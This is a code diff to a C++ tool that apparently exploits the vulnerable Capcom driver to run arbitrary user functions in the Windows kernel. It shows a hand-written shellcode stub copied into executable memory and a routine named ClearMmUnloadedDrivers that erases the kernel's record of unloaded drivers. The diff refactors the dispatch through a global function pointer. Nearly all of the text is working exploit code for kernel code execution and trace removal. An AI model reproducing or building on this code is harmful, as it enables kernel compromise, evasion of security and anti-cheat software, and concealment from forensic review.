@@ -1,5 +1,10 @@
 #include "includes.hpp"
 
+void CapcomDispatcher(kernel::MmGetSystemRoutineAddress mm_get_system_routine_address)
+{
+    (*g_user_function)(mm_get_system_routine_address);
+}
+
 bool CapcomControl::ClearMmUnloadedDrivers()
 {
     void* buffer = nullptr;
@@ -80,68 +85,40 @@ bool CapcomControl::ClearMmUnloadedDrivers()
     return true;
 }
 
-bool CapcomControl::ExecuteUserFunction(user_function p_func, void* p_param)
+bool CapcomControl::ExecuteUserFunction(user_function p_func)
 {
     if (!p_func || !device_handle)
     { 
         return false;
     }
 
+    g_user_function = &p_func;
+
     BYTE* payload_ptr = nullptr;
 
-    if (p_param)
+    BYTE payload_template[] =
     {
-        BYTE payload_template[] =
-        {
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // pointer to start
-            0xE8, 0x08, 0x00, 0x00, 0x00,                               // CALL $+8 - will put p_func into RAX
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // p_func
-            0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MOV RDX, p_param
-            0x58,                                                       // POP RAX
-            0xFF, 0x20                                                  // JMP [RAX]
-        };
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // pointer to start
+        0xE8, 0x08, 0x00, 0x00, 0x00,                               // CALL $+8 - will put p_func into RAX
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // p_func
+        0x58,                                                       // POP RAX
+        0xFF, 0x20                                                  // JMP [RAX]
+    };
 
-        payload_ptr = (BYTE*)VirtualAlloc(nullptr, sizeof(payload_template), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-        if (!payload_ptr)
-        {
-            LOG("[-] VirtualAlloc error %d", GetLastError());
-
-            return false;
-        }
-        
-        ZeroMemory(payload_ptr, sizeof(payload_template));
-        memcpy(payload_ptr, payload_template, sizeof(payload_template));
-
-        *(DWORD64*)payload_ptr = (DWORD64)(payload_ptr + 8);
-        *(DWORD64*)(payload_ptr + 13) = (DWORD64)p_func.target<user_function>();
-        *(DWORD64*)(payload_ptr + 23) = (DWORD64)p_param;
-    }
-    else
+    payload_ptr = (BYTE*)VirtualAlloc(nullptr, sizeof(payload_template), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (!payload_ptr)
     {
-        BYTE payload_template[] =
-        {
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // pointer to start
-            0xE8, 0x08, 0x00, 0x00, 0x00,                               // CALL $+8 - will put p_func into RAX
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // p_func
-            0x58,                                                       // POP RAX
-            0xFF, 0x20                                                  // JMP [RAX]
-        };
+        LOG("[-] VirtualAlloc error %d", GetLastError());
 
-        payload_ptr = (BYTE*)VirtualAlloc(nullptr, sizeof(payload_template), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-        if (!payload_ptr)
-        {
-            LOG("[-] VirtualAlloc error %d", GetLastError());
-
-            return false;
-        }
-
-        ZeroMemory(payload_ptr, sizeof(payload_template));
-        memcpy(payload_ptr, payload_template, sizeof(payload_template));
-
-        *(DWORD64*)payload_ptr = (DWORD64)(payload_ptr + 8);
-        *(DWORD64*)(payload_ptr + 13) = (DWORD64)p_func.target<user_function>();
+        return false;
     }
 
+    ZeroMemory(payload_ptr, sizeof(payload_template));
+    memcpy(payload_ptr, payload_template, sizeof(payload_template));
+
+    *(DWORD64*)payload_ptr = (DWORD64)(payload_ptr + 8);
+    *(DWORD64*)(payload_ptr + 13) = (DWORD64)CapcomDispatcher;
+    
     DWORD output_buf;
     DWORD bytes_returned;
 
